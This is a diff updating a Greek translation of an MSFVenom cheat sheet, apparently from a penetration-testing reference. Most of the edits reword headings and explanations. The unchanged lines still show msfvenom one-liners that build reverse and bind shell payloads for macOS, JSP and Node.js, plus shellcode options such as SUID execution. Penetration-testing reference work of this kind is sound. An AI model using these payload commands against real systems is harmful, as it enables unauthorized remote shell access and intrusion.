@@ -1,8 +1,10 @@
 # MSFVenom - CheatSheet
 
+{{#include ../../banners/hacktricks-training.md}}
+
 ---
 
-## Βασικά του msfvenom
+## Βασικό msfvenom
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
@@ -13,9 +15,9 @@
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
 ```
-Αυτές οι εντολές παραθέτουν τα payload και encoder modules που είναι διαθέσιμα στο εγκατεστημένο framework.<sup>[[1]](#references)</sup>
+Αυτές οι εντολές παραθέτουν τα διαθέσιμα payload και encoder modules στο εγκατεστημένο framework.<sup>[[1]](#references)</sup>
 
-## Common params when creating a shellcode
+## Συνηθισμένες παράμετροι κατά τη δημιουργία shellcode
 ```bash
 -b "\x00\x0a\x0d"
 -f c
@@ -23,7 +25,7 @@ msfvenom -l encoders #Encoders
 EXITFUNC=thread
 PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
 ```
-Οι flags που εμφανίζονται εδώ επιλέγουν bad characters, output format, encoder και encoding iterations.<sup>[[1]](#references)</sup>
+Τα flags που εμφανίζονται εδώ επιλέγουν bad characters, output format, encoder και encoding iterations.<sup>[[1]](#references)</sup>
 
 ## **Windows**
 
@@ -81,7 +83,7 @@ msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f ma
 ```bash
 msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
 ```
-## **Payloads μέσω Web**
+## **Web Based Payloads**
 
 ### **PHP**
 
@@ -113,7 +115,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f w
 ```bash
 msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```
-## **Script Language payloads**
+## **Payloads σε γλώσσες Script**
 
 ### **Perl**
 ```bash
